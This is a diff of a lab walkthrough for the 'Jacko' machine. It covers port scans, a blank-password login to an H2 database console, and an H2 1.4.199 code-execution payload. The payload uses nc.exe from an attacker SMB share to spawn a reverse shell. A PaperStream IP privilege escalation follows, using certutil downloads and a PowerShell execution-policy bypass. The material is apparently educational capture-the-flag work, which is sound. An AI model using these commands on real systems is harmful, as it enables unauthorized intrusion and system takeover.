@@ -42,7 +42,6 @@ Nmap done: 1 IP address (1 host up) scanned in 51.13 secondsmsfvenom -p windows/
 Checking over all ports, we find one more open at 7680.
 ```bash
 $ sudo nmap --min-rate 100 -p- -T4  192.168.225.66  -oA nmap/all 
-[sudo] password for kali: 
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-25 08:49 EDT
 Nmap scan report for ip-192-168-225-66.eu-west-1.compute.internal (192.168.225.66)
 Host is up (0.011s latency).
@@ -60,12 +59,11 @@ Nmap done: 1 IP address (1 host up) scanned in 189.45 seconds
 
 ## Webservers
 
-H2 database console at port 8082
+We find there is a JSP based H2 database console running on port 8082.
 
-JSP based
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425091314.png)
 
-Dirsearch - think these are FPs
+Running some directory enumeration with `dirsearch`, JSP basedthe initial results are not particularly promising.
 ```bash
 [09:02:33] 200 -  937B  - /.do
 [09:02:43] 200 -  937B  - /admin.do
@@ -76,11 +74,9 @@ Dirsearch - think these are FPs
 [09:03:05] 200 -  937B  - /physican/login.do
 ```
 
-port 80 - IIS 10
+On port 80 - we have an IIS 10 webserver containing the documentation for H2.
 
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425091527.png)
-
-Seems to just contain the Tutorial and License etc. Nothing interesting.
 
 Using dirsearch for further enumeration:
 ```bash
@@ -108,39 +104,36 @@ Using dirsearch for further enumeration:
 [09:10:06] Starting: text/
 [09:10:39] Starting: html/images/
 ```
+Seems to just contain the Tutorial and License etc. Nothing particularly interesting. However the changelog shows us the version of H2 installed -  **Version 1.4.199** (2019-03-13)
 
-Changelog shows version of H2 -  **Version 1.4.199** (2019-03-13)
-
-We can login to the database with a blank password
+I then found that this enumeration was somewhat unnecessary as we can **login to the database with a blank password**! Always try blank passwords or generic credentials such as `admin:admin`.
 
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425092949.png)
 
+From some quick searching, we find there is a code execution vulnerability in this version of H2: [49384 - H2 Database 1.4.199 - JNI Code Execution](https://www.exploit-db.com/exploits/49384)
 
-Code execution vulnerability in H2
-
-https://www.exploit-db.com/exploits/49384
-
-Host nc.exe on SMB server 
+From here we can host `nc.exe` on an SMB server from Kali: 
 ```bash
-sudo impacket-smbserver data -smb2support  .
+impacket-smbserver data -smb2support  .
 ```
 
+And use the Java template from the exploit to remotely execute it for a reverse shell.
 ```java
 CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
 CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.49.225/data/nc.exe -e cmd.exe 192.168.49.225 8082").getInputStream()).useDelimiter("\\Z").next()');
 ```
 
-![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425094238.png)
-
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425094250.png)
+
+![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425094238.png)
 
 # Post Exploitation
 
-Get shell - weirdly doesn't have the command whoami
+Now we successfully have shell access - but as soon as we try to execute a simple command like `whoami`, we run into errors.
 
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425094342.png)
 
-We can fix this by setting PATH
+We can fix issue this by setting the `PATH` variable.
 
 ```
 set PATH=%SystemRoot%\system32;%SystemRoot%;
@@ -148,32 +141,32 @@ set PATH=%SystemRoot%\system32;%SystemRoot%;
 
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425094707.png)
 
-Host Name:                 JACKO
-OS Name:                   Microsoft Windows 10 Pro
-OS Version:                10.0.18363 N/A Build 18363
+## Privilege Escalation
 
-Running winPEAS
+Running winPEAS, we get a few interesting results for write permissions and unquoted paths. However I was not able to exploit these, although they may be other possible attack paths.
+
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425100928.png)
 
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425101156.png)
-
 
 It is always a good idea to check the Program Files directories during the enumeration phase to gather information on any unusual software that may be installed on the machine. Here in `Program Files (x86)` we can see PaperStream IP:
 
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425101322.png)
 
-[PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation](https://www.exploit-db.com/exploits/49382)
+If we search for this software we find a disclosed LPE - [PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation](https://www.exploit-db.com/exploits/49382)
 
-Upload PS script and DLL via certutil
+Following the instructions in this exploit, upload a PS script and DLL via `certutil` (or otherwise).
 ```bash
 certutil -urlcache -split -f http://192.168.49.225/49382.ps1 49382.ps1
 certutil -urlcache -split -f http://192.168.49.225/UninOldIS.dll UninOldIS.dll
 ```
 
+Now we can execute the exploit to locally privilege escalate and receive a connect back to our listener.
 ```powershell
 C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\Users\tony\Documents\49382.ps1
 ```
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425110206.png)
 
-System shell
+At this point we have system shell access on Jacko.
+
 ![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425110047.png)
